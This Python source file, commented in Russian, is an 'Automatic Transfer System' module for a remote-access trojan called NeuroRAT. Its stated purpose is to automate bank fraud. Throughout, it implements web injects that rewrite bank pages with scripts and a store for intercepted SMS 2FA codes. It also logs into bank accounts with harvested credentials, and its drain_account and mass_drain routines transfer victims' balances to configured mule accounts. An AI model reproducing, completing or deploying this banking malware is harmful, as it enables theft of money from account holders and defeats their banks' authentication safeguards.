"""
ATS Module - Automatic Transfer System для NeuroRAT

Модуль предназначен для автоматизации банковских операций, обхода 2FA и массового дрейна средств.
Поддерживает различные типы банковских систем, веб-инъекции и интеграцию с мобильными банками.
"""

import os
import re
import json
import time
import logging
import random
import base64
import hashlib
from typing import Dict, List, Any, Optional, Tuple, Union
from datetime import datetime

# Импорт зависимостей для модуля
try:
    import requests
    from bs4 import BeautifulSoup
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Настройка логирования
logger = logging.getLogger('ats_module')
logger.setLevel(logging.INFO)
if not logger.handlers:
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)

class ATSConfig:
    """Конфигурация ATS-модуля"""
    
    def __init__(self, config_file: Optional[str] = None):
        """
        Инициализация конфигурации ATS
        
        Args:
            config_file: Путь к файлу конфигурации (опционально)
        """
        # Базовая конфигурация по умолчанию
        self.config = {
            "timeout": 30,  # таймаут запросов в секундах
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
            ],
            "withdrawal_limits": {
                "daily": 5000,   # макс. сумма вывода в день
                "transaction": 2000  # макс. сумма одной транзакции
            },
            "banks": {
                # Шаблоны для разных банков будут загружаться из отдельных файлов
            },
            "mules": {
                # Список банковских аккаунтов "мулов" для вывода средств
            },
            "exchange_services": {
                # Список криптообменников и API для вывода
            },
            "webinjects": {
                # Шаблоны веб-инъекций для разных банков
            },
            "sms_interceptors": {
                # Конфигурация перехватчиков SMS
            }
        }
        
        # Загружаем конфигурацию из файла, если указан
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_config = json.load(f)
                    # Объединяем с конфигурацией по умолчанию
                    self._merge_configs(loaded_config)
                logger.info(f"Конфигурация ATS загружена из {config_file}")
            except Exception as e:
                logger.error(f"Ошибка загрузки конфигурации ATS: {str(e)}")
    
    def _merge_configs(self, loaded_config: Dict[str, Any]) -> None:
        """
        Объединяет загруженную конфигурацию с конфигурацией по умолчанию
        
        Args:
            loaded_config: Загруженная из файла конфигурация
        """
        for key, value in loaded_config.items():
            if key in self.config and isinstance(self.config[key], dict) and isinstance(value, dict):
                # Рекурсивно объединяем вложенные словари
                self.config[key].update(value)
            else:
                # Просто заменяем значение
                self.config[key] = value
    
    def get(self, key: str, default: Any = None) -> Any:
        """
        Получение значения из конфигурации
        
        Args:
            key: Ключ конфигурации
            default: Значение по умолчанию, если ключ не найден
            
        Returns:
            Any: Значение из конфигурации или значение по умолчанию
        """
        return self.config.get(key, default)
    
    def save(self, config_file: str) -> bool:
        """
        Сохранение конфигурации в файл
        
        Args:
            config_file: Путь к файлу конфигурации
            
        Returns:
            bool: True, если сохранение успешно, иначе False
        """
        try:
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            logger.info(f"Конфигурация ATS сохранена в {config_file}")
            return True
        except Exception as e:
            logger.error(f"Ошибка сохранения конфигурации ATS: {str(e)}")
            return False

class WebInject:
    """Класс для работы с веб-инъекциями"""
    
    def __init__(self, bank_type: str, config: ATSConfig):
        """
        Инициализация модуля веб-инъекций
        
        Args:
            bank_type: Тип банка (id банка в конфигурации)
            config: Конфигурация ATS
        """
        self.bank_type = bank_type
        self.config = config
        self.webinjects = config.get("webinjects", {}).get(bank_type, {})
        
        # Загружаем шаблоны инъекций для данного банка
        if not self.webinjects:
            webinject_file = f"data/webinjects/{bank_type}.json"
            if os.path.exists(webinject_file):
                try:
                    with open(webinject_file, 'r') as f:
                        self.webinjects = json.load(f)
                    logger.info(f"Загружены шаблоны инъекций для {bank_type}")
                except Exception as e:
                    logger.error(f"Ошибка загрузки шаблонов инъекций для {bank_type}: {str(e)}")

    def reload_webinjects(self, webinject_data: Optional[Dict[str, Any]] = None, webinject_file: Optional[str] = None) -> bool:
        """
        Перезагрузка шаблонов веб-инъекций из данных или файла
        
        Args:
            webinject_data: Словарь с данными веб-инъекций (опционально)
            webinject_file: Путь к файлу с веб-инъекциями (опционально)
            
        Returns:
            bool: True если загрузка успешна, иначе False
        """
        if webinject_data:
            self.webinjects = webinject_data
            logger.info(f"Загружены шаблоны инъекций для {self.bank_type} из данных")
            return True
            
        elif webinject_file and os.path.exists(webinject_file):
            try:
                with open(webinject_file, 'r') as f:
                    self.webinjects = json.load(f)
                logger.info(f"Загружены шаблоны инъекций для {self.bank_type} из файла {webinject_file}")
                return True
            except Exception as e:
                logger.error(f"Ошибка загрузки шаблонов инъекций из файла {webinject_file}: {str(e)}")
                return False
        
        # Пытаемся найти инъекции в стандартных местах
        search_paths = [
            f"data/webinjects/{self.bank_type}.json",
            f"webinjects/{self.bank_type}.json",
            f"{os.path.dirname(os.path.abspath(__file__))}/data/webinjects/{self.bank_type}.json"
        ]
        
        for path in search_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        self.webinjects = json.load(f)
                    logger.info(f"Загружены шаблоны инъекций для {self.bank_type} из файла {path}")
                    return True
                except Exception as e:
                    logger.error(f"Ошибка загрузки шаблонов инъекций из файла {path}: {str(e)}")
        
        return False

    def save_webinjects(self, file_path: Optional[str] = None) -> bool:
        """
        Сохранение текущих веб-инъекций в файл
        
        Args:
            file_path: Путь к файлу для сохранения (опционально)
            
        Returns:
            bool: True если сохранение успешно, иначе False
        """
        if not file_path:
            file_path = f"data/webinjects/{self.bank_type}.json"
            
        try:
            # Создаем директорию, если она не существует
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            with open(file_path, 'w') as f:
                json.dump(self.webinjects, f, indent=2)
            logger.info(f"Шаблоны инъекций для {self.bank_type} сохранены в {file_path}")
            return True
        except Exception as e:
            logger.error(f"Ошибка сохранения шаблонов инъекций в файл {file_path}: {str(e)}")
            return False

    def get_inject_for_url(self, url: str) -> Optional[Dict[str, Any]]:
        """
        Получение подходящей инъекции для URL
        
        Args:
            url: URL страницы банка
            
        Returns:
            Optional[Dict[str, Any]]: Шаблон инъекции или None, если не найден
        """
        for inject in self.webinjects.get("injects", []):
            if "url_pattern" in inject and re.search(inject["url_pattern"], url):
                return inject
        return None
    
    def modify_html(self, html: str, inject_data: Dict[str, Any]) -> str:
        """
        Модификация HTML-страницы с использованием инъекции
        
        Args:
            html: Исходный HTML
            inject_data: Данные инъекции
            
        Returns:
            str: Модифицированный HTML
        """
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # Добавляем скрипты
            if "scripts" in inject_data:
                for script in inject_data["scripts"]:
                    script_tag = soup.new_tag("script")
                    if "src" in script:
                        script_tag["src"] = script["src"]
                    if "content" in script:
                        script_tag.string = script["content"]
                    soup.head.append(script_tag)
            
            # Добавляем CSS
            if "styles" in inject_data:
                for style in inject_data["styles"]:
                    style_tag = soup.new_tag("style")
                    style_tag.string = style
                    soup.head.append(style_tag)
            
            # Заменяем элементы
            if "elements" in inject_data:
                for element in inject_data["elements"]:
                    if "selector" in element and "html" in element:
                        target = soup.select_one(element["selector"])
                        if target:
                            target.replace_with(BeautifulSoup(element["html"], 'html.parser'))
            
            return str(soup)
        except Exception as e:
            logger.error(f"Ошибка модификации HTML: {str(e)}")
            return html

class SMSInterceptor:
    """Класс для перехвата SMS и других 2FA-кодов"""
    
    def __init__(self, config: ATSConfig):
        """
        Инициализация перехватчика SMS
        
        Args:
            config: Конфигурация ATS
        """
        self.config = config
        self.intercepted_codes = {}
        
    def register_target(self, phone_number: str, bank_type: str) -> bool:
        """
        Регистрация номера телефона для перехвата
        
        Args:
            phone_number: Номер телефона
            bank_type: Тип банка
            
        Returns:
            bool: True, если регистрация успешна, иначе False
        """
        try:
            # В реальной системе здесь была бы интеграция с сервисом перехвата SMS
            # или с мобильным RAT-клиентом
            
            # Для PoC просто регистрируем номер в локальном хранилище
            self.intercepted_codes[phone_number] = {
                "bank_type": bank_type,
                "last_update": datetime.now().timestamp(),
                "codes": []
            }
            
            logger.info(f"Зарегистрирован перехват SMS для номера {phone_number}")
            return True
        except Exception as e:
            logger.error(f"Ошибка регистрации перехвата SMS: {str(e)}")
            return False
    
    def add_intercepted_code(self, phone_number: str, code: str, timestamp: Optional[float] = None) -> None:
        """
        Добавление перехваченного кода
        
        Args:
            phone_number: Номер телефона
            code: Перехваченный код
            timestamp: Временная метка (по умолчанию - текущее время)
        """
        if phone_number not in self.intercepted_codes:
            self.register_target(phone_number, "unknown")
        
        if timestamp is None:
            timestamp = datetime.now().timestamp()
        
        self.intercepted_codes[phone_number]["codes"].append({
            "code": code,
            "timestamp": timestamp,
            "used": False
        })
        
        # Обновляем время последнего обновления
        self.intercepted_codes[phone_number]["last_update"] = timestamp
        
        logger.info(f"Перехвачен код {code} для номера {phone_number}")
    
    def get_latest_code(self, phone_number: str, max_age_seconds: int = 300) -> Optional[str]:
        """
        Получение последнего перехваченного кода
        
        Args:
            phone_number: Номер телефона
            max_age_seconds: Максимальный возраст кода в секундах
            
        Returns:
            Optional[str]: Последний код или None, если нет подходящего
        """
        if phone_number not in self.intercepted_codes:
            return None
        
        codes = self.intercepted_codes[phone_number]["codes"]
        current_time = datetime.now().timestamp()
        
        # Фильтруем коды по возрасту и сортируем по времени
        valid_codes = [
            c for c in codes 
            if not c["used"] and (current_time - c["timestamp"]) <= max_age_seconds
        ]
        
        if not valid_codes:
            return None
        
        # Берем самый новый код
        latest_code = sorted(valid_codes, key=lambda x: x["timestamp"], reverse=True)[0]
        
        # Помечаем код как использованный
        for code in codes:
            if code["code"] == latest_code["code"] and code["timestamp"] == latest_code["timestamp"]:
                code["used"] = True
                break
        
        return latest_code["code"]

class BankSession:
    """Класс для работы с сессией банка"""
    
    def __init__(self, bank_type: str, config: ATSConfig):
        """
        Инициализация сессии банка
        
        Args:
            bank_type: Тип банка
            config: Конфигурация ATS
        """
        self.bank_type = bank_type
        self.config = config
        self.session = requests.Session() if REQUESTS_AVAILABLE else None
        self.authenticated = False
        self.account_info = {}
        self.balance = 0.0
        self.webinject = WebInject(bank_type, config)
        self.user_agent = random.choice(config.get("user_agents"))
        
        # Инициализируем заголовки сессии
        if self.session:
            self.session.headers.update({
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            })
    
    def login(self, credentials: Dict[str, str]) -> bool:
        """
        Вход в банковский аккаунт
        
        Args:
            credentials: Учетные данные (логин, пароль и т.д.)
            
        Returns:
            bool: True, если вход успешен, иначе False
        """
        if not REQUESTS_AVAILABLE or not self.session:
            return False
        
        # Получаем параметры для данного типа банка
        bank_params = self.config.get("banks", {}).get(self.bank_type)
        if not bank_params:
            logger.error(f"Отсутствуют параметры для банка {self.bank_type}")
            return False
        
        login_url = bank_params.get("login_url")
        if not login_url:
            logger.error(f"Отсутствует URL входа для банка {self.bank_type}")
            return False
        
        try:
            # Отправляем запрос на страницу входа для получения токенов/cookies
            response = self.session.get(login_url, timeout=self.config.get("timeout"))
            
            # Проверяем, нужно ли модифицировать страницу с помощью инъекции
            inject = self.webinject.get_inject_for_url(login_url)
            if inject:
                # В реальной системе здесь был бы прокси для модификации страницы
                logger.info(f"Найдена инъекция для {login_url}")
            
            # Получаем параметры для формы входа
            login_form = bank_params.get("login_form", {})
            login_data = {}
            
            # Заполняем форму входа
            for field, value in login_form.items():
                if value.startswith("$"):
                    # Это переменная, которую нужно заменить значением из credentials
                    var_name = value[1:]
                    if var_name in credentials:
                        login_data[field] = credentials[var_name]
                else:
                    # Статическое значение
                    login_data[field] = value
            
            # Отправляем форму входа
            login_action = bank_params.get("login_action", login_url)
            response = self.session.post(
                login_action,
                data=login_data,
                timeout=self.config.get("timeout")
            )
            
            # Проверяем успешность входа
            success_pattern = bank_params.get("login_success_pattern")
            if success_pattern and re.search(success_pattern, response.text):
                self.authenticated = True
                logger.info(f"Вход в {self.bank_type} успешен")
                
                # Получаем информацию о счете
                self._update_account_info()
                return True
            else:
                logger.error(f"Вход в {self.bank_type} не удался")
                return False
            
        except Exception as e:
            logger.error(f"Ошибка входа в {self.bank_type}: {str(e)}")
            return False
    
    def _update_account_info(self) -> None:
        """Обновление информации о счете"""
        if not REQUESTS_AVAILABLE or not self.session or not self.authenticated:
            return
        
        # Получаем параметры для данного типа банка
        bank_params = self.config.get("banks", {}).get(self.bank_type)
        if not bank_params:
            return
        
        account_url = bank_params.get("account_url")
        if not account_url:
            return
        
        try:
            # Запрашиваем информацию о счете
            response = self.session.get(
                account_url,
                timeout=self.config.get("timeout")
            )
            
            # Извлекаем данные о счете с помощью регулярных выражений
            balance_pattern = bank_params.get("balance_pattern")
            if balance_pattern:
                balance_match = re.search(balance_pattern, response.text)
                if balance_match:
                    self.balance = float(balance_match.group(1).replace(',', ''))
            
            # Извлекаем другую информацию о счете
            account_patterns = bank_params.get("account_patterns", {})
            for key, pattern in account_patterns.items():
                match = re.search(pattern, response.text)
                if match:
                    self.account_info[key] = match.group(1)
            
            logger.info(f"Обновлена информация о счете {self.bank_type}, баланс: {self.balance}")
            
        except Exception as e:
            logger.error(f"Ошибка обновления информации о счете {self.bank_type}: {str(e)}")
    
    def transfer(self, target_account: str, amount: float, description: str = "") -> Dict[str, Any]:
        """
        Выполнение перевода средств
        
        Args:
            target_account: Номер счета получателя
            amount: Сумма перевода
            description: Описание перевода
            
        Returns:
            Dict[str, Any]: Результат перевода
        """
        if not REQUESTS_AVAILABLE or not self.session or not self.authenticated:
            return {"status": "error", "message": "Не авторизован"}
        
        # Проверяем лимиты
        if amount > self.config.get("withdrawal_limits", {}).get("transaction", float('inf')):
            return {"status": "error", "message": "Превышен лимит на транзакцию"}
        
        # Проверяем баланс
        if amount > self.balance:
            return {"status": "error", "message": "Недостаточно средств"}
        
        # Получаем параметры для данного типа банка
        bank_params = self.config.get("banks", {}).get(self.bank_type)
        if not bank_params:
            return {"status": "error", "message": "Отсутствуют параметры банка"}
        
        transfer_url = bank_params.get("transfer_url")
        if not transfer_url:
            return {"status": "error", "message": "Отсутствует URL перевода"}
        
        try:
            # Получаем форму перевода
            response = self.session.get(
                transfer_url,
                timeout=self.config.get("timeout")
            )
            
            # Заполняем форму перевода
            transfer_form = bank_params.get("transfer_form", {})
            transfer_data = {}
            
            # Заполняем данные формы
            for field, value in transfer_form.items():
                if value == "$TARGET_ACCOUNT":
                    transfer_data[field] = target_account
                elif value == "$AMOUNT":
                    transfer_data[field] = str(amount)
                elif value == "$DESCRIPTION":
                    transfer_data[field] = description
                else:
                    transfer_data[field] = value
            
            # Отправляем форму перевода
            transfer_action = bank_params.get("transfer_action", transfer_url)
            response = self.session.post(
                transfer_action,
                data=transfer_data,
                timeout=self.config.get("timeout")
            )
            
            # Проверяем, требуется ли подтверждение (2FA)
            confirmation_pattern = bank_params.get("confirmation_pattern")
            if confirmation_pattern and re.search(confirmation_pattern, response.text):
                # Возвращаем статус, что требуется подтверждение
                return {
                    "status": "confirmation_required",
                    "message": "Требуется подтверждение",
                    "confirmation_url": bank_params.get("confirmation_url", transfer_action),
                    "session_id": self.session.cookies.get(bank_params.get("session_cookie", ""))
                }
            
            # Проверяем успешность перевода
            success_pattern = bank_params.get("transfer_success_pattern")
            if success_pattern and re.search(success_pattern, response.text):
                # Обновляем информацию о счете
                self._update_account_info()
                
                return {
                    "status": "success",
                    "message": "Перевод выполнен",
                    "amount": amount,
                    "target": target_account,
                    "balance": self.balance
                }
            else:
                return {"status": "error", "message": "Ошибка перевода"}
            
        except Exception as e:
            logger.error(f"Ошибка перевода {self.bank_type}: {str(e)}")
            return {"status": "error", "message": str(e)}
    
    def confirm_transfer(self, confirmation_data: Dict[str, str]) -> Dict[str, Any]:
        """
        Подтверждение перевода (2FA)
        
        Args:
            confirmation_data: Данные для подтверждения (код и др.)
            
        Returns:
            Dict[str, Any]: Результат подтверждения
        """
        if not REQUESTS_AVAILABLE or not self.session or not self.authenticated:
            return {"status": "error", "message": "Не авторизован"}
        
        # Получаем параметры для данного типа банка
        bank_params = self.config.get("banks", {}).get(self.bank_type)
        if not bank_params:
            return {"status": "error", "message": "Отсутствуют параметры банка"}
        
        confirmation_url = bank_params.get("confirmation_url")
        if not confirmation_url:
            return {"status": "error", "message": "Отсутствует URL подтверждения"}
        
        try:
            # Заполняем форму подтверждения
            confirmation_form = bank_params.get("confirmation_form", {})
            confirmation_post_data = {}
            
            # Заполняем данные формы
            for field, value in confirmation_form.items():
                if value.startswith("$"):
                    var_name = value[1:]
                    if var_name in confirmation_data:
                        confirmation_post_data[field] = confirmation_data[var_name]
                else:
                    confirmation_post_data[field] = value
            
            # Отправляем форму подтверждения
            confirmation_action = bank_params.get("confirmation_action", confirmation_url)
            response = self.session.post(
                confirmation_action,
                data=confirmation_post_data,
                timeout=self.config.get("timeout")
            )
            
            # Проверяем успешность подтверждения
            success_pattern = bank_params.get("confirmation_success_pattern")
            if success_pattern and re.search(success_pattern, response.text):
                # Обновляем информацию о счете
                self._update_account_info()
                
                return {
                    "status": "success",
                    "message": "Перевод подтвержден",
                    "balance": self.balance
                }
            else:
                return {"status": "error", "message": "Ошибка подтверждения"}
            
        except Exception as e:
            logger.error(f"Ошибка подтверждения {self.bank_type}: {str(e)}")
            return {"status": "error", "message": str(e)}

class AutomaticTransferSystem:
    """Основной класс ATS-модуля"""
    
    def __init__(self, config_file: Optional[str] = None):
        """
        Инициализация ATS-модуля
        
        Args:
            config_file: Путь к файлу конфигурации (опционально)
        """
        self.config = ATSConfig(config_file)
        self.sms_interceptor = SMSInterceptor(self.config)
        self.active_sessions = {}
        self.results = []
        self.webinjects_registry = {}  # Реестр загруженных веб-инъекций
        
        logger.info("ATS-модуль инициализирован")
    
    def register_webinject(self, bank_type: str, inject_data: Dict[str, Any], save_to_file: bool = True) -> bool:
        """
        Регистрация веб-инъекции для конкретного банка
        
        Args:
            bank_type: Тип банка
            inject_data: Данные веб-инъекции
            save_to_file: Сохранять ли инъекцию в файл
            
        Returns:
            bool: True если регистрация успешна, иначе False
        """
        try:
            # Создаем экземпляр WebInject, если его еще нет
            if bank_type not in self.webinjects_registry:
                self.webinjects_registry[bank_type] = WebInject(bank_type, self.config)
            
            # Обновляем данные инъекции
            self.webinjects_registry[bank_type].webinjects = inject_data
            
            # Сохраняем в файл, если нужно
            if save_to_file:
                self.webinjects_registry[bank_type].save_webinjects()
            
            # Обновляем инъекции в активных сессиях для этого банка
            for session_id, session in self.active_sessions.items():
                if session.bank_type == bank_type and hasattr(session, 'webinject'):
                    session.webinject.webinjects = inject_data
            
            logger.info(f"Веб-инъекция для {bank_type} успешно зарегистрирована")
            return True
            
        except Exception as e:
            logger.error(f"Ошибка регистрации веб-инъекции для {bank_type}: {str(e)}")
            return False
    
    def get_webinject(self, bank_type: str) -> Optional[WebInject]:
        """
        Получение веб-инъекции для конкретного банка
        
        Args:
            bank_type: Тип банка
            
        Returns:
            Optional[WebInject]: Экземпляр WebInject или None, если не найден
        """
        if bank_type in self.webinjects_registry:
            return self.webinjects_registry[bank_type]
        
        # Если инъекция не найдена в реестре, пытаемся создать новую
        try:
            inject = WebInject(bank_type, self.config)
            if inject.webinjects:  # Если удалось загрузить инъекции из файла
                self.webinjects_registry[bank_type] = inject
                return inject
        except Exception as e:
            logger.error(f"Ошибка создания веб-инъекции для {bank_type}: {str(e)}")
        
        return None
    
    def load_webinjects_from_directory(self, directory: str = "data/webinjects") -> Dict[str, bool]:
        """
        Загрузка всех веб-инъекций из директории
        
        Args:
            directory: Путь к директории с файлами веб-инъекций
            
        Returns:
            Dict[str, bool]: Словарь результатов загрузки {имя_банка: успех}
        """
        results = {}
        
        if not os.path.exists(directory):
            logger.warning(f"Директория {directory} не существует")
            return results
        
        for filename in os.listdir(directory):
            if filename.endswith(".json"):
                bank_type = os.path.splitext(filename)[0]
                file_path = os.path.join(directory, filename)
                
                try:
                    with open(file_path, 'r') as f:
                        inject_data = json.load(f)
                    
                    success = self.register_webinject(bank_type, inject_data, save_to_file=False)
                    results[bank_type] = success
                except Exception as e:
                    logger.error(f"Ошибка загрузки веб-инъекции из файла {file_path}: {str(e)}")
                    results[bank_type] = False
        
        return results
    
    def login_to_bank(self, bank_type: str, credentials: Dict[str, str]) -> bool:
        """
        Вход в банковский аккаунт
        
        Args:
            bank_type: Тип банка
            credentials: Учетные данные
            
        Returns:
            bool: True, если вход успешен, иначе False
        """
        if not REQUESTS_AVAILABLE:
            logger.error("Отсутствует библиотека requests")
            return False
        
        # Создаем новую сессию для данного банка
        session = BankSession(bank_type, self.config)
        
        # Выполняем вход
        result = session.login(credentials)
        
        if result:
            # Если вход успешен, сохраняем сессию
            session_id = f"{bank_type}_{credentials.get('username', 'unknown')}_{int(time.time())}"
            self.active_sessions[session_id] = session
            
            # Регистрируем перехват SMS, если указан номер телефона
            if "phone" in credentials:
                self.sms_interceptor.register_target(credentials["phone"], bank_type)
            
            logger.info(f"Создана сессия {session_id}")
            return True
        else:
            logger.error(f"Не удалось войти в {bank_type}")
            return False
    
    def drain_account(self, session_id: str, target_account: str, amount: Optional[float] = None) -> Dict[str, Any]:
        """
        Дрейн средств с аккаунта
        
        Args:
            session_id: ID сессии
            target_account: Счет получателя
            amount: Сумма (если None, то максимальная доступная)
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        if session_id not in self.active_sessions:
            return {"status": "error", "message": "Сессия не найдена"}
        
        session = self.active_sessions[session_id]
        
        # Если сумма не указана, берем максимально доступную
        if amount is None:
            # Учитываем лимит на транзакцию
            max_transaction = self.config.get("withdrawal_limits", {}).get("transaction", float('inf'))
            amount = min(session.balance, max_transaction)
        
        # Выполняем перевод
        result = session.transfer(target_account, amount)
        
        # Если требуется подтверждение (2FA)
        if result.get("status") == "confirmation_required":
            # Сохраняем информацию о незавершенном переводе для последующего подтверждения
            result["session_id"] = session_id
            result["target_account"] = target_account
            result["amount"] = amount
            
            logger.info(f"Требуется подтверждение для перевода {amount} на {target_account}")
        
        # Сохраняем результат
        self.results.append({
            "timestamp": datetime.now().timestamp(),
            "session_id": session_id,
            "operation": "drain",
            "amount": amount,
            "target": target_account,
            "status": result.get("status")
        })
        
        return result
    
    def confirm_transfer_with_sms(self, session_id: str, phone: str) -> Dict[str, Any]:
        """
        Подтверждение перевода с помощью перехваченного SMS-кода
        
        Args:
            session_id: ID сессии
            phone: Номер телефона для перехвата SMS
            
        Returns:
            Dict[str, Any]: Результат подтверждения
        """
        if session_id not in self.active_sessions:
            return {"status": "error", "message": "Сессия не найдена"}
        
        session = self.active_sessions[session_id]
        
        # Ждем и получаем перехваченный код
        code = self.sms_interceptor.get_latest_code(phone)
        if not code:
            return {"status": "error", "message": "Код не перехвачен"}
        
        # Подтверждаем перевод
        result = session.confirm_transfer({"CODE": code})
        
        # Сохраняем результат
        self.results.append({
            "timestamp": datetime.now().timestamp(),
            "session_id": session_id,
            "operation": "confirm",
            "code": code,
            "status": result.get("status")
        })
        
        return result
    
    def mass_drain(self, credentials_list: List[Dict[str, Any]], target_account: str) -> Dict[str, Any]:
        """
        Массовый дрейн средств с нескольких аккаунтов
        
        Args:
            credentials_list: Список учетных данных
            target_account: Счет получателя
            
        Returns:
            Dict[str, Any]: Результат операции
        """
        results = {
            "total_attempts": len(credentials_list),
            "successful": 0,
            "failed": 0,
            "pending": 0,
            "total_amount": 0.0,
            "details": []
        }
        
        for creds in credentials_list:
            bank_type = creds.get("bank_type")
            
            # Выполняем вход
            session_id = None
            login_result = self.login_to_bank(bank_type, creds)
            
            if login_result:
                # Получаем ID сессии
                for sid, sess in self.active_sessions.items():
                    if sess.bank_type == bank_type and getattr(sess, "authenticated", False):
                        session_id = sid
                        break
                
                if session_id:
                    # Выполняем дрейн
                    drain_result = self.drain_account(session_id, target_account)
                    
                    # Обрабатываем результат
                    if drain_result.get("status") == "success":
                        results["successful"] += 1
                        results["total_amount"] += drain_result.get("amount", 0.0)
                    elif drain_result.get("status") == "confirmation_required":
                        results["pending"] += 1
                    else:
                        results["failed"] += 1
                    
                    # Добавляем детали
                    results["details"].append({
                        "bank_type": bank_type,
                        "status": drain_result.get("status"),
                        "message": drain_result.get("message"),
                        "amount": drain_result.get("amount", 0.0),
                        "session_id": session_id
                    })
                else:
                    results["failed"] += 1
                    results["details"].append({
                        "bank_type": bank_type,
                        "status": "error",
                        "message": "Не удалось создать сессию"
                    })
            else:
                results["failed"] += 1
                results["details"].append({
                    "bank_type": bank_type,
                    "status": "error",
                    "message": "Не удалось войти"
                })
        
        return results
    
    def get_results(self) -> List[Dict[str, Any]]:
        """
        Получение результатов операций
        
        Returns:
            List[Dict[str, Any]]: Список результатов
        """
        return self.results
    
    def cleanup(self) -> None:
        """Очистка сессий и результатов"""
        self.active_sessions = {}
        self.results = []
        logger.info("Выполнена очистка ATS-модуля")


# Функция для создания и инициализации ATS
def create_ats(config_file: Optional[str] = None) -> AutomaticTransferSystem:
    """
    Создание экземпляра ATS
    
    Args:
        config_file: Путь к файлу конфигурации
        
    Returns:
        AutomaticTransferSystem: Инициализированный экземпляр ATS
    """
    ats = AutomaticTransferSystem(config_file)
    
    # Пытаемся загрузить все доступные веб-инъекции
    ats.load_webinjects_from_directory()
    
    return ats 